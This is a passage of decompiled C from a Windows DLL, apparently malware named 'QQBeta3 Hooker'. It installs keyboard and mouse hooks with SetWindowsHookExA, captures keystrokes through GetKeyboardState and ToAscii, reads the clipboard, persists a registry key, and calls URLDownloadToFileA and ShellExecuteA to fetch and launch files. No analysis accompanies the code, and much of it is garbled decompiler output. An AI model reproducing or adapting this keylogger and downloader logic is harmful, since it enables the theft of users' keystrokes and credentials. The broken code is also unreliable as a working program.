        char v58 = *v57 ^ v15; // 0x404ace
        *v57 = v58;
        int32_t v59; // 0x40495e
        if (v58 < 0) {
            // 0x404b04
            __writefsdword(result, v59);
            g91++;
            result = 0;
            __writefsdword(0, a3);
            int32_t v60; // bp+12, 0x40495e
            *(int32_t *)((int32_t)&v60 - 4) = 0x404b22;
            return result;
        }
        char * v61 = (char *)(v6 + 48 + 8 * v6); // 0x404b38
        *v61 = *v61 + (char)(result / 256);
        __writefsdword(result, v59);
        g92++;
        result = 0;
        __writefsdword(0, a3);
        // 0x404b52
        return result;
    }
    if (v53 != 0) {
        if (v53 < v52) {
            // 0x404b52
            return result;
        }
        int32_t v62 = 110 * *(int32_t *)(v8 + 106); // 0x404ae7
        *(int32_t *)(v62 - 4) = 0x626e6a30;
        *(int32_t *)(v62 - 8) = 0x3066;
        char * v63 = (char *)(v8 - 117); // 0x404af5
        *v63 = *v63 + (char)v9;
        return result & -256 | (int32_t)__asm_in(v10);
    }
    // 0x404a75
    __asm_outsb(v10, *(char *)v5);
    int32_t v64 = result;
    *(char *)v64 = *(char *)&result + (char)v64;
    int32_t v65 = result;
    *(char *)v65 = *(char *)&result + (char)v65;
    int32_t v66 = result;
    *(char *)v66 = *(char *)&result + (char)v66;
    int32_t v67 = result;
    *(char *)v67 = *(char *)&result + (char)v67;
    int32_t v68 = result;
    *(char *)v68 = *(char *)&result + (char)v68;
    int32_t v69 = result;
    *(char *)v69 = *(char *)&result + (char)v69;
    int32_t v70 = result;
    *(char *)v70 = *(char *)&result + (char)v70;
    int32_t v71 = result;
    *(char *)v71 = *(char *)&result + (char)v71;
    int32_t v72 = result;
    *(char *)v72 = *(char *)&result + (char)v72;
    int32_t v73 = result;
    *(char *)v73 = *(char *)&result + (char)v73;
    int32_t v74 = result;
    *(char *)v74 = *(char *)&result + (char)v74;
    int32_t v75 = result;
    *(char *)v75 = *(char *)&result + (char)v75;
    int32_t v76 = result;
    *(char *)v76 = *(char *)&result + (char)v76;
    int32_t v77 = result;
    *(char *)v77 = *(char *)&result + (char)v77;
    int32_t v78 = result;
    *(char *)v78 = *(char *)&result + (char)v78;
    int32_t v79 = result;
    *(char *)v79 = *(char *)&result + (char)v79;
    int32_t v80 = result;
    *(char *)v80 = *(char *)&result + (char)v80;
    int32_t v81 = result;
    *(char *)v81 = *(char *)&result + (char)v81;
    int32_t v82 = result;
    *(char *)v82 = *(char *)&result + (char)v82;
    int32_t v83 = result;
    *(char *)v83 = *(char *)&result + (char)v83;
    int32_t v84 = result;
    *(char *)v84 = *(char *)&result + (char)v84;
    int32_t v85 = result;
    *(char *)v85 = *(char *)&result + (char)v85;
    int32_t v86 = result;
    *(char *)v86 = *(char *)&result + (char)v86;
    int32_t v87 = result;
    *(char *)v87 = *(char *)&result + (char)v87;
    int32_t v88 = result;
    *(char *)v88 = *(char *)&result + (char)v88;
    int32_t v89 = result;
    *(char *)v89 = *(char *)&result + (char)v89;
    return result;
}

// Address range: 0x404b5a - 0x404b5c
int32_t function_404b5a(int32_t a1) {
    // 0x404b5a
    int32_t result; // 0x404b5a
    return result;
}

// Address range: 0x404b5e - 0x404b66
int32_t function_404b5e(void) {
    // 0x404b5e
    g92--;
    int32_t result; // 0x404b5e
    return result;
}

// Address range: 0x404b66 - 0x404b6c
int32_t * function_404b66(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd) {
    // 0x404b66
    return ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

// Address range: 0x404b6e - 0x404b93
int32_t function_404b6e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404b79
    __writefsdword(0, (int32_t)&v1);
    g93++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404b93 - 0x404b98
int32_t function_404b93(void) {
    // 0x404b93
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404b98 - 0x404b9a
int32_t function_404b98(void) {
    // 0x404b98
    int32_t result; // 0x404b98
    return result;
}

// Address range: 0x404b9a - 0x404b9c
int32_t function_404b9a(int32_t a1) {
    // 0x404b9a
    int32_t result; // 0x404b9a
    return result;
}

// Address range: 0x404b9e - 0x404ba6
int32_t function_404b9e(void) {
    // 0x404b9e
    g93--;
    int32_t result; // 0x404b9e
    return result;
}

// Address range: 0x404ba6 - 0x404bcb
int32_t function_404ba6(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404bb1
    __writefsdword(0, (int32_t)&v1);
    g94++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404bcb - 0x404bd0
int32_t function_404bcb(void) {
    // 0x404bcb
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404bd0 - 0x404bd2
int32_t function_404bd0(void) {
    // 0x404bd0
    int32_t result; // 0x404bd0
    return result;
}

// Address range: 0x404bd2 - 0x404bd4
int32_t function_404bd2(int32_t a1) {
    // 0x404bd2
    int32_t result; // 0x404bd2
    return result;
}

// Address range: 0x404bd6 - 0x404bde
int32_t function_404bd6(void) {
    // 0x404bd6
    g94--;
    int32_t result; // 0x404bd6
    return result;
}

// Address range: 0x404bde - 0x404c03
int32_t function_404bde(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404be9
    __writefsdword(0, (int32_t)&v1);
    g95++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404c03 - 0x404c08
int32_t function_404c03(void) {
    // 0x404c03
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404c08 - 0x404c0a
int32_t function_404c08(void) {
    // 0x404c08
    int32_t result; // 0x404c08
    return result;
}

// Address range: 0x404c0a - 0x404c0c
int32_t function_404c0a(int32_t a1) {
    // 0x404c0a
    int32_t result; // 0x404c0a
    return result;
}

// Address range: 0x404c0e - 0x404c16
int32_t function_404c0e(void) {
    // 0x404c0e
    g95--;
    int32_t result; // 0x404c0e
    return result;
}

// Address range: 0x404c16 - 0x404c1c
int32_t function_404c16(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5) {
    // 0x404c16
    return URLDownloadToFileA(a1, a2, a3, a4, a5);
}

// Address range: 0x404c1e - 0x404c43
int32_t function_404c1e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404c29
    __writefsdword(0, (int32_t)&v1);
    g96++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404c43 - 0x404c48
int32_t function_404c43(void) {
    // 0x404c43
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404c48 - 0x404c4a
int32_t function_404c48(void) {
    // 0x404c48
    int32_t result; // 0x404c48
    return result;
}

// Address range: 0x404c4a - 0x404c4c
int32_t function_404c4a(int32_t a1) {
    // 0x404c4a
    int32_t result; // 0x404c4a
    return result;
}

// Address range: 0x404c4e - 0x404c56
int32_t function_404c4e(void) {
    // 0x404c4e
    g96--;
    int32_t result; // 0x404c4e
    return result;
}

// Address range: 0x404c56 - 0x404c6c
int32_t function_404c56(void) {
    // 0x404c56
    int32_t v1; // 0x404c56
    int32_t v2 = v1 & 255;
    if ((char)v1 < 10) {
        // 0x404c5a
        return v2 + 48;
    }
    // 0x404c63
    return v2 + 55;
}

// Address range: 0x404c6e - 0x404d92
int32_t function_404c6e(void) {
    // 0x404c6e
    function_403806();
    int32_t v1 = __readfsdword(0); // bp-52, 0x404c97
    int32_t v2 = &v1; // 0x404c97
    __writefsdword(0, v2);
    function_4034be();
    int32_t v3 = function_403616(); // 0x404ca7
    int32_t v4 = v2; // 0x404cb0
    int32_t v5; // 0x404c6e
    int32_t v6; // 0x404c6e
    int32_t v7; // 0x404c6e
    int32_t v8; // 0x404c6e
    int32_t v9; // 0x404c6e
    unsigned char v10; // 0x404cbe
    if (v3 >= 1) {
        // 0x404cbb
        v5 = 1;
        v7 = v2;
        v6 = v3;
        while (true) {
          lab_0x404cbb:
            // 0x404cbb
            v8 = v7;
            int32_t v11; // 0x404c6e
            v10 = *(char *)(v11 - 1 + v5);
            if (v10 != 32) {
                if (v10 < 32) {
                    goto lab_0x404cf9;
                } else {
                    unsigned char v12 = v10 - 32; // 0x404ce7
                    if (v12 < 96) {
                        // branch -> 0x404cf7
                    }
                    // 0x404cf7
                    if (v12 >= 95) {
                        // 0x404d4e
                        function_4035b2();
                        function_40361e();
                        v9 = v8;
                        goto lab_0x404d67;
                    } else {
                        goto lab_0x404cf9;
                    }
                }
            } else {
                // 0x404cc5
                function_40361e();
                v9 = v8;
                goto lab_0x404d67;
            }
        }
    }
  lab_0x404d6f:
    // 0x404d6f
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x404d99;
    function_4034e2();
    return function_4034be();
  lab_0x404cf9:
    // 0x404cf9
    *(int32_t *)(v8 - 4) = (int32_t)(v10 & 15);
    *(int32_t *)(v8 - 8) = (int32_t)&g1;
    function_404c56();
    function_4035b2();
    *(int32_t *)(v8 - 12) = 0;
    function_404c56();
    function_4035b2();
    int32_t v13 = v8 - 16; // 0x404d3d
    *(int32_t *)v13 = 0;
    function_4036d6((int32_t)&g117);
    v9 = v13;
    goto lab_0x404d67;
  lab_0x404d67:;
    int32_t v14 = v6 - 1; // 0x404d68
    v5++;
    v7 = v9;
    v6 = v14;
    v4 = v9;
    if (v14 == 0) {
        // break -> 0x404d6f
        goto lab_0x404d6f;
    }
    goto lab_0x404cbb;
}

// Address range: 0x404d92 - 0x404d97
int32_t function_404d92(void) {
    // 0x404d92
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404d97 - 0x404d99
int32_t function_404d97(void) {
    // 0x404d97
    int32_t result; // 0x404d97
    return result;
}

// Address range: 0x404d99 - 0x404da0
int32_t function_404d99(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404d99
    int32_t result; // 0x404d99
    return result;
}

// Address range: 0x404dbd - 0x404e34
int32_t function_404dbd(void) {
    // 0x404dbd
    int32_t v1; // 0x404dbd
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404dbd
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    *(char *)0x55000000 = *(char *)0x55000000 + (char)(v2 / 256);
    function_403806();
    int32_t v4 = __readfsdword(0); // bp-24, 0x404de7
    __writefsdword(0, (int32_t)&v4);
    function_4036d6(v2);
    int32_t v5 = function_403816(); // 0x404e0c
    URLDownloadToFileA((int32_t *)v5, NULL, (char *)&g117, (int32_t)&g117, &g117);
    __writefsdword(0, 0);
    return function_4034e2();
}

// Address range: 0x404dc6 - 0x404dc7
int32_t function_404dc6(void) {
    // 0x404dc6
    int32_t result; // 0x404dc6
    return result;
}

// Address range: 0x404e34 - 0x404e39
int32_t function_404e34(void) {
    // 0x404e34
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404e39 - 0x404e3b
int32_t function_404e39(void) {
    // 0x404e39
    int32_t result; // 0x404e39
    return result;
}

// Address range: 0x404e3b - 0x404e40
int32_t function_404e3b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x404e3b
    int32_t result; // 0x404e3b
    return result;
}

// Address range: 0x404e45 - 0x404e73
int32_t function_404e45(void) {
    // 0x404e45
    int32_t v1; // 0x404e45
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404e45
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x404e45
    uint32_t v5; // 0x404e45
    *(char *)v4 = *(char *)&v4 + (char)(v5 / 256);
    int32_t v6 = v2;
    *(char *)v6 = *(char *)&v2 + (char)v6;
    int32_t v7; // 0x404e45
    char * v8 = (char *)(v7 - 117); // 0x404e4d
    int32_t v9; // 0x404e45
    *v8 = *v8 + (char)v9;
    __asm_in((int16_t)v9);
    int32_t v10 = __readfsdword(0); // bp-12, 0x404e59
    __writefsdword(0, (int32_t)&v10);
    g97++;
    __writefsdword(0, v10);
    return 0;
}

// Address range: 0x404e73 - 0x404e78
int32_t function_404e73(void) {
    // 0x404e73
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404e78 - 0x404e7a
int32_t function_404e78(void) {
    // 0x404e78
    int32_t result; // 0x404e78
    return result;
}

// Address range: 0x404e7a - 0x404e7c
int32_t function_404e7a(int32_t a1) {
    // 0x404e7a
    int32_t result; // 0x404e7a
    return result;
}

// Address range: 0x404e7e - 0x404e86
int32_t function_404e7e(void) {
    // 0x404e7e
    g97--;
    int32_t result; // 0x404e7e
    return result;
}

// Address range: 0x404e86 - 0x404f05
int32_t function_404e86(void) {
    // 0x404e86
    function_403512();
    int32_t lpSubKey = 0; // bp-116, 0x404e9a
    int32_t lpReserved = 0; // bp-128, 0x404ea0
    int32_t ** lpValueName = (int32_t **)"Software\\mz\\QQBeta3 Hooker"; // bp-132, 0x404ea2
    int32_t result = RegOpenKeyExA(0, (char *)&lpSubKey, 1, 0, (int32_t **)"Software\\mz\\QQBeta3 Hooker"); // 0x404eac
    if (result != 0) {
        // 0x404f00
        return result;
    }
    // 0x404ebb
    lpValueName = (int32_t **)101;
    int32_t v1 = RegQueryValueExA((int32_t *)101, (char *)&lpValueName, &lpReserved, &g27, NULL, (int32_t *)"First Run"); // 0x404ede
    if (v1 == 0) {
        // 0x404ee7
        function_4035fe();
    }
    // 0x404f00
    return RegCloseKey((int32_t *)-0x7fffffff);
}

// Address range: 0x404f09 - 0x404fdc
int32_t function_404f09(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a2;
    int32_t v3; // 0x404f09
    *(int32_t *)v3 = v3 + 1;
    int32_t result; // 0x404f09
    int32_t v4 = result;
    *(char *)v4 = *(char *)&result + (char)v4;
    int32_t v5; // 0x404f09
    char * v6 = (char *)(v5 + 122); // 0x404f0d
    uint32_t v7; // 0x404f09
    *v6 = *v6 + (char)(v7 / 256);
    unsigned char v8 = *(char *)&result; // 0x404f10
    unsigned char v9 = v8 + (char)result; // 0x404f10
    *(char *)result = v9;
    int32_t v10; // 0x404f09
    __asm_outsd((int16_t)v3, v10);
    if (v9 == 0) {
        unknown_4f8e();
    }
    // 0x404f17
    result = v2;
    int32_t * v11; // 0x404f09
    int32_t v12; // 0x404f09
    int32_t v13; // 0x404f09
    if (v9 < v8) {
        // 0x404f7f
        *(char *)v13 = (char)v13 + (char)a3;
        char * v14 = (char *)a4; // 0x404f82
        *v14 = *v14 + (char)(a3 / 256);
        v11 = &v1;
        goto lab_0x404f85;
    } else {
        char v15 = llvm_ctpop_i8(v9); // 0x404f10
        *(int32_t *)v13 = __asm_insd((int16_t)a4);
        if ((v15 & 1) == 0) {
            // 0x404f7a
            return result;
        }
        // 0x404f1e
        v1 = a3;
        v2 = a3;
        int32_t v16 = a4 + 1; // 0x404f20
        v11 = &v2;
        if (v16 == 0) {
            goto lab_0x404f85;
        } else {
            int32_t v17 = result - 1; // 0x404f26
            result = v17;
            int16_t v18 = v16; // 0x404f27
            int32_t * v19 = (int32_t *)a7; // 0x404f27
            __asm_outsd(v18, *v19);
            __asm_outsd(v18, *v19);
            char * v20 = (char *)(a7 + 105); // 0x404f2d
            unsigned char v21 = *v20; // 0x404f2d
            unsigned char v22 = v21 + (char)v17; // 0x404f2d
            *v20 = v22;
            v12 = 0;
            if (v22 >= v21) {
                if (v22 == 0) {
                    // 0x404f54
                    *(int32_t *)-4 = *(int32_t *)result;
                    __writefsdword(result, -4);
                    *(int32_t *)-8 = (int32_t)"Software\\mz\\QQBeta3 Hooker";
                    *(int32_t *)-12 = -0x7fffffff;
                    RegDeleteKeyA(&g117, (char *)&g117);
                    *(int32_t *)(a6 - 8) = 0;
                    int32_t result2 = a6 - 12; // 0x404f6d
                    *(int32_t *)result2 = 1;
                    *(int32_t *)-16 = result2;
                    return result2;
                }
                // 0x404f34
                *(int32_t *)-4 = v16;
                v12 = -4;
            }
            goto lab_0x404fa5;
        }
    }
  lab_0x404f85:;
    int32_t v23 = (int32_t)v11;
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 0;
    *(int32_t *)(v23 - 12) = (int32_t)"Software\\mz\\QQBeta3 Hooker";
    *(int32_t *)(v23 - 16) = -0x7fffffff;
    RegCreateKeyExA(&g117, (char *)&g117, (int32_t)&g117, (char *)&g117, (int32_t)&g117, (int32_t)&g117, (struct _SECURITY_ATTRIBUTES *)&g117, (int32_t **)&g117, &g117);
    int32_t v24 = function_403616(); // 0x404f9b
    int32_t v25 = v23 - 20; // 0x404fa1
    *(int32_t *)v25 = v24 + 1;
    v12 = v25;
    goto lab_0x404fa5;
  lab_0x404fa5:
    // 0x404fa5
    *(int32_t *)(v12 - 4) = function_403816();
    *(int32_t *)(v12 - 8) = 1;
    *(int32_t *)(v12 - 12) = 0;
    int32_t * v26 = (int32_t *)(v12 - 16); // 0x404faf
    *v26 = (int32_t)"First Run";
    int32_t * v27 = (int32_t *)(a6 - 8); // 0x404fb4
    *(int32_t *)(v12 - 20) = *v27;
    RegSetValueExA(&g117, (char *)&g117, (int32_t)&g117, (int32_t)&g117, (char *)&g117, (int32_t)&g117);
    int32_t * v28 = (int32_t *)(v12 - 24); // 0x404fc0
    *v28 = *v27;
    RegCloseKey(&g117);
    __writefsdword(0, *v28);
    *v26 = 0x404fe3;
    return function_4034be();
}

// Address range: 0x404fdc - 0x404fe1
int32_t function_404fdc(void) {
    // 0x404fdc
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x404fe1 - 0x404fe3
int32_t function_404fe1(void) {
    // 0x404fe1
    int32_t result; // 0x404fe1
    return result;
}

// Address range: 0x404fe3 - 0x404fe7
int32_t function_404fe3(void) {
    // 0x404fe3
    int32_t result; // 0x404fe3
    return result;
}

// Address range: 0x404fe7 - 0x405060
int32_t function_404fe7(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x404fe7
    int32_t v1; // 0x404fe7
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x404fe7
    char * v3 = (char *)(v2 + 111); // 0x404fe9
    unsigned char v4 = *v3; // 0x404fe9
    int32_t v5; // 0x404fe7
    unsigned char v6 = v4 + (char)v5; // 0x404fe9
    *v3 = v6;
    if (v6 == 0) {
        unknown_5066();
    }
    if (v6 < v4) {
        // 0x40505d
        return CloseClipboard();
    }
    char v7 = llvm_ctpop_i8(v6); // 0x404fe9
    *(int32_t *)a8 = __asm_insd((int16_t)a4);
    if ((v7 & 1) == 0) {
        // 0x405052
        GlobalUnlock(&g117);
        // 0x40505d
        return CloseClipboard();
    }
    int32_t v8 = a4 + 1; // 0x404ff8
    if (v8 == 0) {
        // 0x40505d
        return result;
    }
    int32_t v9 = result - 1; // 0x404ffe
    int16_t v10 = v8; // 0x404fff
    int32_t * v11 = (int32_t *)a7; // 0x404fff
    __asm_outsd(v10, *v11);
    __asm_outsd(v10, *v11);
    char * v12 = (char *)(a7 + 105); // 0x405005
    char v13 = v9; // 0x405005
    char v14 = *v12 + v13; // 0x405005
    *v12 = v14;
    if (v14 != 0) {
        // 0x40500c
        *(int32_t *)-4 = v8;
        char * v15 = (char *)v9; // 0x40500f
        *v15 = *v15 + v13;
        char * v16 = (char *)(a5 + 86); // 0x405011
        *v16 = *v16 + (char)v8;
        *(int32_t *)-8 = a8;
        function_4034be();
        *(int32_t *)-12 = 0;
        return OpenClipboard(&g117);
    }
    char * v17 = (char *)(2 * a6 + 106); // 0x40502c
    *v17 = 2 * *v17;
    int32_t * v18 = GetClipboardData((int32_t)&g117); // 0x405031
    if (v18 == NULL) {
        // 0x40505d
        return CloseClipboard();
    }
    int32_t v19 = (int32_t)v18; // 0x405031
    *(int32_t *)-4 = v19;
    if (GlobalLock(&g117) == NULL) {
        // 0x40505d
        return CloseClipboard();
    }
    // 0x405048
    function_4035c2();
    *(int32_t *)-8 = v19;
    // 0x405052
    GlobalUnlock(&g117);
    // 0x40505d
    return CloseClipboard();
}

// Address range: 0x405062 - 0x4050af
int32_t DllGetClassObject(int32_t a1) {
    // 0x405062
    int32_t v1; // 0x405062
    char * lpWindowName = (char *)v1; // 0x405065
    char * lpThreadAttributes = lpWindowName; // bp-8, 0x405065
    if (*(int32_t *)*(int32_t *)0x408138 == 0) {
        // 0x40509e
        *(int32_t *)a1 = 0;
        return -0x7ffbfeef;
    }
    // 0x405075
    int32_t lpClassName; // 0x405062
    if (FindWindowA((char *)lpClassName, lpWindowName) == NULL) {
        // 0x405088
        CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))66, (int32_t *)0x406836, 0, NULL);
    }
    // 0x40509e
    *(int32_t *)a1 = 0;
    return -0x7ffbfeef;
}

// Address range: 0x4050ca - 0x4050cd
int32_t DllCanUnloadNow(void) {
    // 0x4050ca
    return 0;
}

// Address range: 0x4050ce - 0x4050d1
int32_t DllRegisterServer(void) {
    // 0x4050ce
    return 0;
}

// Address range: 0x4050d2 - 0x4050d5
int32_t DllUnregisterServer(void) {
    // 0x4050d2
    return 0;
}

// Address range: 0x4050d6 - 0x4050fb
int32_t function_4050d6(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4050e1
    __writefsdword(0, (int32_t)&v1);
    g98++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4050fb - 0x405100
int32_t function_4050fb(void) {
    // 0x4050fb
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405100 - 0x405102
int32_t function_405100(void) {
    // 0x405100
    int32_t result; // 0x405100
    return result;
}

// Address range: 0x405102 - 0x405104
int32_t function_405102(int32_t a1) {
    // 0x405102
    int32_t result; // 0x405102
    return result;
}

// Address range: 0x405106 - 0x40510e
int32_t function_405106(void) {
    // 0x405106
    g98--;
    int32_t result; // 0x405106
    return result;
}

// Address range: 0x40510e - 0x405222
int32_t function_40510e(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-292, 0x405130
    int32_t v2 = &v1; // 0x405130
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x405145
    if (function_40731a() != 0) {
        int32_t uFlags; // 0x40510e
        switch (uFlags) {
            case 8: {
                // 0x405159
                function_4073b6();
                function_4038b6();
                v3 = v2;
                // break -> 0x405209
                break;
            }
            case 46: {
                // 0x405178
                function_4073b6();
                function_4038b6();
                v3 = v2;
                // break -> 0x405209
                break;
            }
            default: {
                // 0x405195
                int32_t lpKeyState; // bp-264, 0x40510e
                GetKeyboardState((char *)&lpKeyState);
                int32_t v4; // bp-316, 0x40510e
                int32_t v5 = &v4; // 0x4051b8
                int32_t uScanCode; // bp-8, 0x40510e
                uint32_t v6; // 0x40510e
                int32_t v7 = ToAscii(0, (int32_t)&uScanCode, (char *)&lpKeyState, (int16_t *)(v6 / 0x10000 & 255), uFlags); // 0x4051b9
                v3 = v5;
                if (v7 == 1) {
                    // 0x4051c1
                    v3 = v5;
                    if (function_40707e() != 0) {
                        // 0x4051cd
                        v3 = v5;
                        if (function_403616() <= 15) {
                            // 0x4051de
                            function_4073b6();
                            function_4035b2();
                            function_4038fe();
                            v3 = v5;
                        }
                    }
                }
                // break -> 0x405209
                break;
            }
        }
    }
    // 0x405209
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x405229;
    return function_4034be();
}

// Address range: 0x405222 - 0x405227
int32_t function_405222(void) {
    // 0x405222
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x405227 - 0x405229
int32_t function_405227(void) {
    // 0x405227
    int32_t result; // 0x405227
    return result;
}

// Address range: 0x405229 - 0x405230
int32_t function_405229(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405229
    int32_t result; // 0x405229
    return result;
}

// Address range: 0x405232 - 0x4052f1
int32_t function_405232(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x405245
    int32_t v2 = &v1; // 0x405245
    __writefsdword(0, v2);
    function_40731a();
    __writefsdword(0, v1);
    *(int32_t *)(v2 + 8) = 0x4052f8;
    return function_4034e2();
}

// Address range: 0x4052f1 - 0x4052f6
int32_t function_4052f1(void) {
    // 0x4052f1
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4052f6 - 0x4052f8
int32_t function_4052f6(void) {
    // 0x4052f6
    int32_t result; // 0x4052f6
    return result;
}

// Address range: 0x4052f8 - 0x4052fe
int32_t function_4052f8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4052f8
    int32_t result; // 0x4052f8
    return result;
}

// Address range: 0x4052fe - 0x405378
int32_t function_4052fe(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x40530e
    int32_t v2 = &v1; // 0x40530e
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x40531d
    if (function_40728a() != 0) {
        // 0x40531f
        int32_t lpszWindow; // 0x4052fe
        int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"ComboBox", NULL, (char *)lpszWindow); // 0x405329
        int32_t v4 = (int32_t)hWnd; // bp-44, 0x405330
        int32_t v5 = &v4; // 0x405330
        if (!IsWindow(hWnd)) {
            // 0x40535d
            function_407546();
            v3 = v5;
        } else {
            // 0x40533a
            function_4070ea();
            function_403512();
            function_407412();
            v3 = v5;
        }
    }
    // 0x405362
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x40537f;
    return function_4034be();
}

// Address range: 0x405378 - 0x40537d
int32_t function_405378(void) {
    // 0x405378
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x40537d - 0x40537f
int32_t function_40537d(void) {
    // 0x40537d
    int32_t result; // 0x40537d
    return result;
}

// Address range: 0x40537f - 0x405383
int32_t function_40537f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40537f
    int32_t result; // 0x40537f
    return result;
}

// Address range: 0x405383 - 0x4053fd
int32_t function_405383(void) {
    // 0x405383
    int32_t v1; // 0x405383
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x405383
    char * v3 = (char *)(v2 + 111); // 0x405385
    int32_t v4; // 0x405383
    *v3 = *v3 + (char)v4;
    int32_t v5; // 0x405383
    int16_t v6 = v5; // 0x405388
    int32_t v7; // 0x405383
    *(int32_t *)v7 = __asm_insd(v6);
    int32_t v8 = __asm_bound(*(int64_t *)(v7 + 66)); // 0x405389
    int32_t v9; // 0x405383
    __asm_outsd(v6, v9);
    int32_t v10 = v4;
    *(char *)v10 = *(char *)&v4 + (char)v10;
    char * v11 = (char *)(v8 - 117); // 0x405391
    *v11 = *v11 + (char)v5;
    __asm_in(v6);
    int32_t hhk = *(int32_t *)(v8 + 16); // 0x405398
    int32_t nCode = *(int32_t *)(v8 + 12); // 0x40539b
    int32_t wParam = *(int32_t *)(v8 + 8); // 0x40539e
    if (nCode == 1 != (wParam == 0 == (*(int32_t *)*(int32_t *)0x40812c != 0))) {
        // 0x4053e8
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g100);
    }
    // 0x4053b9
    v4 = hhk;
    switch (*(int32_t *)(hhk + 4)) {
        case 256: {
            // 0x4053d0
            function_40510e(v2, v9, v7);
            // break -> 0x4053e8
            break;
        }
        case 770: {
            // 0x4053e1
            function_405232(v2, v9, v7);
            // break -> 0x4053e8
            break;
        }
    }
    // 0x4053e8
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g100);
}

// Address range: 0x4053fe - 0x405445
int32_t function_4053fe(int32_t hhk, int32_t nCode, int32_t wParam) {
    // 0x4053fe
    if (wParam == 0 != g32 != 0) {
        // 0x40542e
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
    }
    // 0x40541c
    if (*(int32_t *)(hhk + 8) == 2) {
        // 0x405426
        int32_t v1; // 0x4053fe
        int32_t v2; // 0x4053fe
        int32_t v3; // 0x4053fe
        function_4052fe(v2, v3, v1);
    }
    // 0x40542e
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
}

// Address range: 0x405446 - 0x40547b
int32_t function_405446(void) {
    // 0x405446
    g100 = (int32_t)SetWindowsHookExA(0, g81, (int32_t *)0x405392, 3);
    int32_t result = (int32_t)SetWindowsHookExA(0, g81, (int32_t *)0x4053fe, 4); // 0x405470
    g101 = result;
    return result;
}

// Address range: 0x40547e - 0x405495
int32_t function_40547e(void) {
    // 0x40547e
    UnhookWindowsHookEx((int32_t *)g100);
    return UnhookWindowsHookEx((int32_t *)g101);
}

// Address range: 0x405496 - 0x4054bb
int32_t function_405496(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4054a1
    __writefsdword(0, (int32_t)&v1);
    g99++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4054bb - 0x4054c0
int32_t function_4054bb(void) {
    // 0x4054bb
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x4054c0 - 0x4054c2
int32_t function_4054c0(void) {
    // 0x4054c0
    int32_t result; // 0x4054c0
    return result;
}

// Address range: 0x4054c2 - 0x4054c4
int32_t function_4054c2(int32_t a1) {
    // 0x4054c2
    int32_t result; // 0x4054c2
    return result;
}

// Address range: 0x4054c6 - 0x4054ce
int32_t function_4054c6(void) {
    // 0x4054c6
    g99--;
    int32_t result; // 0x4054c6
    return result;
}

// Address range: 0x4054d1 - 0x405589
int32_t function_4054d1(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x4054d1
    int32_t v1; // 0x4054d1
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x4054d1
    int32_t v2 = result;
